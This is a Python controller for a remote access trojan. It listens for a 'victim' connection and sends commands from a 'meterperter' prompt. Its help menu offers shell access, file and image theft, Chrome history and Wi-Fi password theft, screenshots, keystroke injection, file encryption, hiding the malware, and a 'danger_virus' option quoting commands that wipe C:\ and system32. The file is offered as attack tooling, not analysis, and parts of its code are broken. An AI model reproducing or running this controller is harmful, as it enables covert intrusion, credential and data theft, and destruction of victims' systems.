
from socket import *
import subprocess
import os
import sys
from time import sleep
from colorama import Fore 
import platform
import random


names = ['hacked1','hacked2','hacked3','hacked4','hacked5','hacked6','hacked7','hacked8','hacked9','hacked10','hacked12']
namefiles = random.choice(names)

oss = platform.uname()

def clear():
    if 'Windows' in oss:
        os.system('cls')
    else:
        os.system('clear')
clear()

server = socket(AF_INET,SOCK_STREAM)
server.bind(("192.168.100.7",1542))
print(Fore.RED+"[+]"+Fore.WHITE+" Waiting for the victim to connect")
server.listen(30)

client,addr = server.accept()
addr_info = tuple(addr)

print(Fore.LIGHTBLUE_EX+"\n[!]"+Fore.YELLOW+"1 Client Connected (: ")

print(Fore.RED+f"\nIP : {addr_info[0]} "+Fore.BLUE+"|"+Fore.RED+f" PORT : {addr_info[1]} \n")

def helplist():
    print(Fore.LIGHTGREEN_EX+"""
    To see Help List : help or ? (For see list)
    ---
    clear screen : clear
    ---
    pwd : pwd 
    ---
    Upload file : upload_file + (with link)
    ---
    Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
    ---
    Download File : pickup + [name of file] (.txt files)
    ---
    Download Image : download
    ---
    Change Directory : cd (cd + [dir name])
    ---
    Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
    ---
    Shutdown,Restart : shutdown,restart
    ---
    open link : open_link + http://example.com (open any link in target system)
    ---
    drives list : dir_ls (see the name of the drives)
    ---
    system information : sys_info 
    ---
    file list : ls (see all the file names that you are in drive)
    ---
    Remove file : remove + [filename] (delete any files for ever)
    ---
    Hack System Wlans : hackwifi (get name) , getpass_[name]
    ---
    upload txt file : uptxt_ + [your text,dont use space] + [yourname]
    ---
    Access Shell : cmd_+[you text] (For Access CMD)
    ---
    Bad Sound : Badvoice_ + [Time]
    ---
    Speak : say_ + [Your Text]
    ---
    remove Background : rmback
    ---
    Volume -> 100% : volumeup
    ---
    Volume -> 0% : volumedown
    ---
    Take Screen Shot : screenshot
    ---
    History Of Chrome : history
    ---
    read txt files : read + [txt file name] (read txt files in terminal so fast)
    ---
    Encrypt File : encode + [File name] + [password] (For Encrypt Any File)
    ---
    Decrypt File : decode + [File name] + [password] (For Decrypt Any)
    ---
    Type : type + [Text] (Type with targets keyboard)
    ---
    set clipboard : set clipboard [Your Text]
    ---
    send alert : show [Title]@[Text] (in this option you can show alert on target's screen)
    ---
    unhide Malware : unhide_malware (show malware icon to your target)
    ---
    hide Malware : hide_malware (if you unhide the malware, again you can hide it)
    ---
    spam on his system : spam (your target gonna see to many alert on his screen)
    """)
helplist()
# print(Fore.WHITE+client.recv(12345).decode())

def main_part():
    while True:
        command = input(Fore.LIGHTRED_EX+"  meterperter > ")
        if command == "\n" or command == "":
            print('   ')
            main_part()
        if command == 'clear':
            clear()
            main_part()
        elif command == "?" or command == "help":
            helplist()
            main_part()
        elif command == 'exit': 
            exit()
        elif 'download ' in command:
            picname = command.replace('download ','')
            download()
            main_part()
        elif 'pickup' in command:
            txtname = command.replace('pickup ','')
        
        try:
            client.send(command.encode())
        except:
            print(Fore.RED+"Connection is Broken ! ! !")
            sleep(0.8)
            import keyboard
            keyboard.write('exit')

        try:
            data = client.recv(9999999999).decode()


            if "Mr.404" in data:
                sfile = open(f'Hacked/TXT Files/{txtname}.txt','w').write(data)
                print(Fore.LIGHTGREEN_EX +'File Download , Please Check Hacked Folder')
            else:
                print(Fore.LIGHTGREEN_EX + f"   {data}")
        except:
            continue

        def download():
            client.send('download '.encode()+picname.encode())
            data = b""
            while True:
                tmp_data = client.recv(1024)
                if tmp_data == b"endendend":
                    print(Fore.LIGHTGREEN_EX+"Done, Please Check Hacked folder")
                    break
                data += tmp_data

            if ".png" in picname or ".jpg" in picname or ".jpeg" in picname or ".ico" in picname or ".tiff" in picname:
                file = open('Hacked/Images/'+picname , mode="wb")
                file.write(data)
                file.close()
            elif ".mp3" in picname or ".mp4" in picname or ".WAV" in picname:
                file = open('Hacked/Audio/'+picname , mode="wb")
                file.write(data)
                file.close()
            elif ".pdf" in command:
                file = open('Hacked/PDF/'+picname , mode="wb")
                file.write(data)
                file.close()  
            elif ".exe" in picname:
                file = open('Hacked/EXE Files/'+picname , mode="wb")
                file.write(data)
                file.close()
            else:
                file = open('Hacked/Unknown Formats/'+picname , mode="wb")
                file.write(data)
                file.close()
main_part()

